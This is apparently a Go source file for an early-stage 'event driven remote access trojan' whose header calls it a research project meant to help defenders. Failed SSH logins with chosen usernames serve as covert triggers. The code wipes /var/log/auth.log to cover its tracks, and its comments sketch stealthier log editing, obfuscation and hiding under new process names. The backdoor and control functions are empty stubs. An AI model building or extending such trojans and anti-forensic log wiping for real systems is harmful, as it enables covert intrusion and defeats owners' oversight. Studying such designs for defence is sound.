package main

import (
	"bufio"
	"fmt"
	"github.com/google/uuid"
	"os"
	"strings"
	"time"
)

// COMMENT BANNER
// Welcome to the event driven remote access trojan
// We are a work in progress

// THIS IS A RESEARCH PROJECT TO BE USED AT YOUR OWN RISK AGAINST YOUR OWN SYSTEMS
// THIS IS NOT A TOOL FOR HACKING THE GIBSON OR BEING 1337
// THIS IS A WEAK IMPLEMENTATION OF THE IDEA TO HELP INNOVATORS THINK ABOUT DEFENCES

const (
	// If checkinUser is in auth.log erat will beacon healthcheck metadata to the control plane
	checkinUser = "robertm"
	// If selfDestructUser is present in auth.log erat will self-destruct
	selfDestructUser = "jonathonl"
	// If openPortUser is present in auth.log erat will open a port and return that port configuration to control plane
	openPortUser = "andrewb"
	// If evadeUser is in auth.log erat will evade by going into a cryo state, with an updated awake time to control
	evadeUser = "susank"
)

// backdoorDetails to send control plane for access initiation
type backdoorDetails struct {
	Protocol       string
	PortInt        uint16
	TimeoutSeconds uint16
}

// systemDetails that could be anything from user activity, procs, etc
type systemDetails struct {
	GuestOS string
	Users   []string
}

// evadeDetails will provide timeline to state change to awake
// setting to int64 to comply with the time.now.utc type though uint32 is better to stay small may revisit
type evadeDetails struct {
	awakeTimeDelta int64 `default:86400`
}

// checkinDetails containing heartbeat data not all required minimum recommended to stay small
type checkinDetails struct {
	Uuid     uuid.UUID
	Backdoor backdoorDetails
	Message  string
	Evade    evadeDetails
}

type readLogDetails struct {
	isFound    bool
	actionUser string
}

// readLog will read the provided log file and look for provided string then truncate the file
func readLog(logFile string, searchString string) (readLogDetails, error) {
	var rlDetails readLogDetails
	// User is our trigger word
	fcontent, _ := os.Open(logFile)
	defer fcontent.Close()
	fscanner := bufio.NewScanner(fcontent)
	// we assume the file was truncated after last read so any instance is new
	// TODO: race condition needs to be handled by checkin to control so we only have a 1 to 1 event to action before control sends more
	// TODO: this can be highly optimized by increasing the file read complexity and adding state to track log line timestamps and an action queue
	for fscanner.Scan() {
		if strings.Contains(fscanner.Text(), searchString) {
			rlDetails.isFound = true
			// get action user from string
			wantedLine := fscanner.Text()
			lastIndex := strings.LastIndex(wantedLine, "=")
			rlDetails.actionUser = wantedLine[lastIndex+1:]
		}
	}
	// truncate to cleanup adfger read
	// this could be implementated with stealth as a line removal instead of brute force with truncate
	// you can also calculate base file size when erat wakes and always truncate to pre erat messaging length as an alternative
	_ := os.Truncate(logFile, 0)
	return rlDetails, nil
}

// Open a backdoor and checkin with details to the control plane
func openBackdoor() backdoorDetails {
	return backdoorDetails{}
}

// Self destruct to evade or based on system events to prevent forensics
// If called a checkin event will alert control of dead node
func selfDestruct() bool {
	return true
}

// Checkin to the control plane may pass a message back
func controlCheckin() checkinDetails {
	return checkinDetails{}
}

// Evade will drop the program into a cryo sleep to awake on a determined timeline
// Evade may also cause erat to move itself through the filesystem or replicate locally to hide with new proc names etc
func evade(awakeTimeDelta int64) {
	var awakeDetails evadeDetails
	utcNow := time.Now().Unix()
	awakeDetails.awakeTimeDelta = utcNow + awakeTimeDelta
}

// main is the business end we will want to obfuscate and shrink code once readability is unnecessary
func main() {
	logFile := "/var/log/auth.log"
	eventBaseLogLine := "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost= user="
	actionUser, _ := readLog(logFile, eventBaseLogLine)
	fmt.Println(actionUser)
}
